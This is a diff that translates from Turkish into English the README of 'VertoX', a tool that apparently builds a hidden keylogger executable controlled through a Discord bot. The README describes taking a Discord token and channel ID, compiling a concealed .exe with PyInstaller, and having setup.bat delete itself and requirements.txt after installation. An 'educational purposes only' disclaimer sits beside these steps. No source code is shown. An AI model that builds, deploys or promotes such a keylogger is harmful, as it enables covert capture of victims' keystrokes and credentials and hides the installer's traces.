@@ -1,26 +1,26 @@
 # VertoX 🔒
 
-**VertoX**, gelişmiş bir Python tabanlı Discord bot destekli araçtır. Kullanıcıya özel araçlar oluşturabilir, webhook mesajları gönderebilir, ve bazı otomatikleştirilmiş işlevler sunar. Ayrıca kurulum sonrası kendini temizleyen bir sistemle çalışır.
+**VertoX** is an advanced Python-based Discord bot-powered tool. It can create user-specific widgets, send webhooks, and offer some automated functionality. It also operates with a self-cleaning system after installation.
 
 ---
 
-## 🚀 Özellikler
+## 🚀 Features
 
-- ✅ Kullanıcıdan Discord token ve kanal bilgisi alarak keylogger oluşturur.
-- 🧠 Akıllı `token` ve `channel ID` doğrulaması.
-- 🔐 Discord’a özel mesaj atan bot ile kontrol.
-- 🧩 PyInstaller ile .exe dosyası oluşturur.
-- 🧼 Kurulum sonrası `setup.bat` ve `requirements.txt` kendini siler.
-- 🎨 Terminal arayüzü `colorama` ile renkli ve şık.
+- ✅ Creates a keylogger by obtaining the user's Discord token and channel information.
+- 🧠 Intelligent token and channel ID verification.
+- 🔐 Control via a bot that sends private messages to Discord.
+- 🧩 Creates an .exe file with PyInstaller.
+- 🧼 Self-cleans `setup.bat` and `requirements.txt` after installation.
+- 🎨 Colorful and stylish terminal interface with `colorama`.
 
 ---
 
-## 📦 Gereksinimler
+## 📦 Requirements
 
-- Python 3.10+ (3.13 test edildi)
+- Python 3.10+ (3.13 tested)
 - pip (Python package manager)
 
-Kurulması gereken Python paketleri:
+Required Python packages to install:
 
 ```bash
 pip install -r requirements.txt
@@ -28,40 +28,40 @@ pip install -r requirements.txt
 
 ---
 
-## ⚙️ Kurulum
+## ⚙️ Installation
 
-### 🔸 Otomatik Kurulum (önerilen)
+### 🔸 Automatic Installation (recommended)
 
 ```bash
-Çift tıkla: setup.bat
+Double-click: setup.bat
 ```
 
-Bu işlem:
+This process:
 
-* Gerekli paketleri yükler (`requirements.txt`)
-* `mainfiles/setup.py` dosyasını çalıştırır
-* Kurulum sonrası kendini ve `requirements.txt`'yi siler
-
----
-
-### 🔹 Manuel Kurulum (alternatif)
-
-1. Gerekli bağımlılıkları kur:
-
-   ```bash
-   pip install -r requirements.txt
-   ```
-2. Setup scriptini çalıştır:
-
-   ```bash
-   python mainfiles/setup.py
-   ```
+* Installs required packages (`requirements.txt`)
+* Runs the file `mainfiles/setup.py`
+* Deletes itself and `requirements.txt` after installation
 
 ---
 
-## 📁 .env Dosyası Örneği
+### 🔹 Manual Installation (alternative)
 
-Projenin kök klasörüne `.env` dosyası oluşturun:
+1. Install required dependencies:
+
+```bash
+pip install -r requirements.txt
+```
+2. Run the setup script:
+
+```bash
+python mainfiles/setup.py
+```
+
+---
+
+## 📁 .env File Example
+
+Create an `.env` file in the project's root folder:
 
 ```env
 TOKEN=your_discord_bot_token
@@ -71,31 +71,31 @@ ADMIN_ID=123456789012345678
 
 ---
 
-## 🔧 Derleme (Keylogger)
+## 🔧 Compilation (Keylogger)
 
-Kurulumdan sonra, `main.py` çalıştırıldığında kullanıcıya:
+After installation, when `main.py` is run, the user is prompted for:
 
 * Discord Token
 * Channel ID
 
-girdisi sorulur ve ardından PyInstaller ile gizli `.exe` dosyası oluşturulur.
+and then a hidden `.exe` file is created with PyInstaller.
 
 ---
 
-## ⚠️ Uyarı
+## ⚠️ Warning
 
-> Bu proje yalnızca **eğitim**, **test** ve **geliştirme** amaçlıdır. İzinsiz şekilde herhangi bir sistemde kullanılması, bulunduğunuz ülkenin yasalarına göre suç teşkil edebilir.
+> This project is for **educational**, **testing**, and **development** purposes only. Using it on any system without permission may be a crime under the laws of your country.
 
 ---
 
-## 👤 Geliştirici
+## 👤 Developer
 
 * Made with ❤️ by [WaqSea](https://github.com/WaqSea)
 
 ---
 
-## 📜 Lisans
+## 📜 License
 
-MIT Lisansı altında yayınlanmıştır. Ayrıntılar için `LICENSE` dosyasını kontrol edin.
+Released under the MIT License. Check the `LICENSE` file for details.
 
 ```
